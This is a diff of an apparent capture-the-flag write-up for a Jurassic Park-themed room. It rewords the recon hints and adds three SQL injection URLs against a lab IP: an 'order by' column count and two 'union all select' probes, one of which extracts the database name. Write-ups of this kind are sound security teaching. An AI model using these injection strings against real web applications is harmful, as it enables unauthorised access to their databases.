@@ -41,8 +41,8 @@ While we wait for the box to deploy let's have a quick look at the room descript
 
 We have a few clues here to help us know where to start:
 
-1. There is a web application running on a port somewhere, make sure we find that with Nmap.
-2. There are 5 flags hidden around the file system, make sure we look for hidden files with *ls -lsa*
+1. There's a web app running on a port somewhere, make sure we find that with Nmap.
+2. There's 5 flags hidden in the file system, make sure we look for those files with *ls -lsa*
 3. It mentions Dennis in italics, is this a hint at a user?
 
 With the above in mind, let's start with Nmap to check for open ports:
@@ -103,13 +103,25 @@ Ok, so we can't use an obvious one like the comment character. That is in the li
 
 Using the order by clause we can find out how many columns the table has by adding one at a time until we get an error. When we get to 6 we see this:
 
+```text
+http://10.10.9.16/item.php?id=5 order by 1,2,3,4,5,6
+```
+
 ![jurassic-orderby](/assets/images/2021-01-27-22-24-25.png)
 
 Now doing a union statement we can see which fields we will be able to use to view information from the database:
 
+```text
+http://10.10.9.16/item.php?id=5 union all select 1,2,3,4,5
+```
+
 ![jurassic-select](/assets/images/2021-01-27-22-28-14.png)
 
 Columns 2, 4 and 5 look to be useable as they are displaying on the page with no additional characters added. Let's see what the database is called:
+
+```text
+http://10.10.9.16/item.php?id=5 union all select 1,database(),3,4,5
+```
 
 ![jurassic-db](/assets/images/2021-01-27-22-33-52.png)
 
